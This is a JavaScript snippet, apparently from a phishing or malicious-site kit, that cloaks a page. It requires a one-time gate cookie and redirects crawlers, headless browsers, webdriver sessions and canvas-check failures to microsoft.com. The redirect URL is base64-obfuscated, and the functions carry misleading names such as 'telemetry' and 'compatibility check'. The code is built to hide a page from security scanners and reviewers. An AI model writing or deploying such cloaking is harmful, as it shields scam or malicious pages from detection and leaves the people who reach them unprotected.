(function () {
    // ========== SESSION TOKEN VALIDATION ==========
    // Check for session token cookie
    var cookies = document.cookie.split(';');
    var hasValidToken = false;

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        if (cookie.startsWith('ev_pass=yes123')) {
            hasValidToken = true;
            break;
        }
    }

    // If no valid token, redirect to safe site
    if (!hasValidToken) {
        window.location.href = 'https://www.microsoft.com';
        return;
    }

    // Valid token found - delete it (one-time use)
    document.cookie = 'ev_pass=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT';


    // ========== BOT DETECTION (Existing Code) ==========
    // Configuration for "telemetry" (Redirect target)
    // Base64 encoded: https://www.microsoft.com
    var _t = "aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ==";

    function _d(s) {
        return window.atob(s);
    }

    function initTelemetry() {
        // "Fail" action - Redirect to benign URL
        window.location.href = _d(_t);
    }

    // Compatibility Check (Bot Detection)
    function checkCompat() {
        var ua = navigator.userAgent.toLowerCase();
        // Encoded patterns for bot/crawler/spider
        var p = /bot|crawler|spider|headless|googlebot|bingbot/i;

        if (p.test(ua)) return true;
        if (navigator.webdriver) return true;
        if (!navigator.plugins || navigator.plugins.length === 0) return true;

        return false;
    }

    // Initialize
    if (checkCompat()) {
        initTelemetry();
        return;
    }

    // Canvas Check (Entropy)
    function validateRender() {
        try {
            var c = document.createElement('canvas');
            var x = c.getContext('2d');
            x.textBaseline = "top";
            x.font = "14px 'Arial'";
            x.fillStyle = "#f60";
            x.fillRect(125, 1, 62, 20);
            x.fillText("hw", 2, 15);
            return c.toDataURL().length < 50;
        } catch (e) {
            return true;
        }
    }

    if (validateRender()) {
        initTelemetry();
    }

})();